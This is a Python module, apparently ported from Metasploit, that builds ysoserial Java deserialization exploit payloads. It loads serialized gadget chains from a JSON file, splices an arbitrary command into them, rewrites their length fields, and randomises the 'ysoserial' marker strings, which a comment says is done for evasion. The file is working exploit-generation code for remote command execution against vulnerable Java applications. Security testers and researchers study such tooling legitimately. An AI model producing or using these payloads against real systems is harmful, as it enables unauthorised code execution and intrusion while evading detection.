#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MSF Java Deserialization Utility

This module provides ysoserial payloads for exploiting Java deserialization vulnerabilities.
"""

import json
import os
import base64
import random
import string


class JavaDeserialization:
    """Java deserialization class using ysoserial payloads"""
    
    PAYLOAD_FILENAME = "ysoserial_payloads.json"
    
    @staticmethod
    def _rand_text_alphanumeric(length):
        """Generate random alphanumeric text"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def _decode_base64(data):
        """Decode base64 data"""
        return base64.b64decode(data)
    
    @classmethod
    def _load_ysoserial_data(cls, modified_type):
        """
        Load ysoserial payload data from JSON file
        
        Args:
            modified_type: Type of modification ('none', 'cmd', 'bash', 'powershell')
            
        Returns:
            Dictionary of payloads
            
        Raises:
            RuntimeError: If unable to load JSON data
            ValueError: If modified_type not found
        """
        # Try to find the data directory - this is a simplified approach
        # In actual Metasploit, this would use Msf::Config.data_directory
        possible_paths = [
            os.path.join(os.path.dirname(__file__), '..', '..', '..', 'data', cls.PAYLOAD_FILENAME),
            os.path.join(os.getcwd(), 'data', cls.PAYLOAD_FILENAME),
            os.path.join('/usr', 'share', 'metasploit-framework', 'data', cls.PAYLOAD_FILENAME)
        ]
        
        path = None
        for p in possible_paths:
            if os.path.exists(p):
                path = p
                break
        
        if not path:
            # NOTE: This would need actual framework data directory resolution
            raise RuntimeError(f"Unable to locate {cls.PAYLOAD_FILENAME} in any expected location")
        
        try:
            with open(path, 'rb') as f:
                json_data = json.load(f)
        except (IOError, json.JSONDecodeError) as e:
            raise RuntimeError(f"Unable to load JSON data from: {path}")
        
        # Extract the specified payload type
        payloads_json = json_data.get(str(modified_type))
        if payloads_json is None:
            raise ValueError(f"{modified_type} type not found in ysoserial payloads")
        
        return payloads_json
    
    @classmethod
    def ysoserial_payload(cls, payload_name, command=None, modified_type='none'):
        """
        Generate a ysoserial payload
        
        Args:
            payload_name: Name of the ysoserial payload
            command: Command to execute (required for dynamic payloads)
            modified_type: Type of modification ('none', 'cmd', 'bash', 'powershell')
            
        Returns:
            Bytes containing the serialized Java payload
            
        Raises:
            ValueError: If payload not found or parameters invalid
            RuntimeError: If JSON file is malformed
        """
        payloads_json = cls._load_ysoserial_data(modified_type)
        
        # Extract the specified payload (status, lengthOffset, bufferOffset, bytes)
        payload = payloads_json.get(payload_name)
        
        if payload is None:
            raise ValueError(f"{payload_name} payload not found in ysoserial payloads")
        
        # Based on the status, we'll raise an exception, return a static payload, or
        # generate a dynamic payload with modifications at the specified offsets
        status = payload.get('status')
        
        if status == 'unsupported':
            # This exception will occur most commonly with complex payloads that require more than a string
            raise ValueError('ysoserial payload is unsupported')
        
        elif status == 'static':
            # TODO: Consider removing 'static' functionality, since ysoserial doesn't currently use it
            return cls._decode_base64(payload['bytes'])
        
        elif status == 'dynamic':
            if command is None:
                raise ValueError('missing command parameter')
            
            bytes_data = bytearray(cls._decode_base64(payload['bytes']))
            
            # Insert buffer
            buffer_offset = payload['bufferOffset'][0]  # TODO: Do we ever need to support multiple buffers?
            # Insert command at buffer_offset - 1 (converting to 0-based indexing)
            insert_pos = buffer_offset - 1
            command_bytes = command.encode('utf-8')
            bytes_data[insert_pos:insert_pos] = command_bytes
            
            # Overwrite length (multiple times, if necessary)
            length_offsets = payload['lengthOffset']
            for length_offset in length_offsets:
                # Extract length as a 16-bit unsigned int (big-endian), then add the length of the command string
                offset_pos = length_offset - 1  # Convert to 0-based
                length = int.from_bytes(bytes_data[offset_pos:offset_pos+2], byteorder='big')
                length += len(command_bytes)
                # Write back as 16-bit big-endian
                bytes_data[offset_pos:offset_pos+2] = length.to_bytes(2, byteorder='big')
            
            # Replace "ysoserial/Pwner" timestamp and "ysoserial" string with randomness for evasion
            bytes_data = bytes_data.replace(b'ysoserial/Pwner00000000000000', 
                                           cls._rand_text_alphanumeric(29).encode('ascii'))
            bytes_data = bytes_data.replace(b'ysoserial', 
                                           cls._rand_text_alphanumeric(9).encode('ascii'))
            
            return bytes(bytes_data)
        
        else:
            raise RuntimeError('Malformed JSON file')
    
    @classmethod
    def ysoserial_payload_names(cls, modified_type='none'):
        """
        Get list of available ysoserial payload names
        
        Args:
            modified_type: Type of modification ('none', 'cmd', 'bash', 'powershell')
            
        Returns:
            List of payload name strings
        """
        payloads_json = cls._load_ysoserial_data(modified_type)
        return list(payloads_json.keys())


if __name__ == '__main__':
    import sys
    
    print("Java Deserialization (ysoserial) Utility")
    print("=" * 50)
    
    # Try to list available payloads
    try:
        print("\nAttempting to load ysoserial payloads...")
        payload_names = JavaDeserialization.ysoserial_payload_names('none')
        print(f"Available payloads ({len(payload_names)}):")
        for name in payload_names[:10]:  # Show first 10
            print(f"  - {name}")
        if len(payload_names) > 10:
            print(f"  ... and {len(payload_names) - 10} more")
        
        if len(sys.argv) > 2:
            payload_type = sys.argv[1]
            command = sys.argv[2]
            print(f"\nGenerating {payload_type} payload for: {command}")
            payload = JavaDeserialization.ysoserial_payload(payload_type, command)
            print(f"Payload generated: {len(payload)} bytes")
            print(f"First 100 bytes (hex): {payload[:100].hex()}")
        else:
            print("\nUsage: python3 java_deserialization.py <payload_type> <command>")
            print("Example: python3 java_deserialization.py CommonsCollections1 'calc.exe'")
    
    except RuntimeError as e:
        print(f"\nNote: {e}")
        print("This is expected if ysoserial_payloads.json is not present.")
        print("In production, this file should be in the Metasploit data directory.")
